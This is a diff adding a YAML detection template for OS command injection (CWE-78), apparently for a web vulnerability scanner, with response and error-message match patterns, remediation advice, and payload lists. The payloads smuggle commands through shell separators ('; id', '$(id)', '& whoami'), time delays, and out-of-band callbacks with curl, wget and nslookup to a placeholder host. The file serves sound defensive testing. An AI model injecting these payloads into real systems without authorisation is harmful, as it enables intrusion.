@@ -1,0 +1,67 @@
+id: command-injection-detection
+title: "Command Injection Detection Patterns"
+category: detection
+description: "Patterns for detecting OS command injection (CWE-78)"
+version: "1.0"
+
+patterns:
+  response_match:
+    - description: "Unix command output in response"
+      patterns:
+        - "uid=\\d+\\(\\w+\\)"
+        - "root:x:0:0"
+        - "/bin/bash"
+        - "/bin/sh"
+      severity: critical
+      cwe: CWE-78
+    - description: "Windows command output in response"
+      patterns:
+        - "\\w+\\\\\\w+"
+        - "Volume Serial Number"
+        - "Directory of"
+      severity: critical
+      cwe: CWE-78
+
+  error_indicators:
+    - description: "Shell error messages"
+      patterns:
+        - "sh: \\d+: .+: not found"
+        - "bash: .+: command not found"
+        - "/bin/sh: .+: not found"
+        - "is not recognized as an internal or external command"
+      severity: high
+      cwe: CWE-78
+
+  payloads:
+    unix_separators:
+      - "; id"
+      - "| id"
+      - "`id`"
+      - "$(id)"
+      - "|| id"
+      - "&& id"
+    windows_separators:
+      - "& whoami"
+      - "| whoami"
+      - "& dir"
+    blind_time:
+      - "; sleep 5"
+      - "| sleep 5"
+      - "$(sleep 5)"
+      - "& timeout /t 5 /nobreak"
+    blind_oob:
+      - "; curl http://{oob}/cmdi"
+      - "| wget http://{oob}/cmdi"
+      - "; nslookup {oob}"
+
+  test_locations:
+    - url_parameters
+    - post_body
+    - cookies
+    - custom_headers
+
+  remediation_summary: >
+    Never pass user input directly to OS commands. Use parameterized
+    APIs (subprocess.run with list args in Python, ProcessBuilder in Java).
+    Validate input against a strict whitelist. Apply least privilege to
+    the application's OS user account.
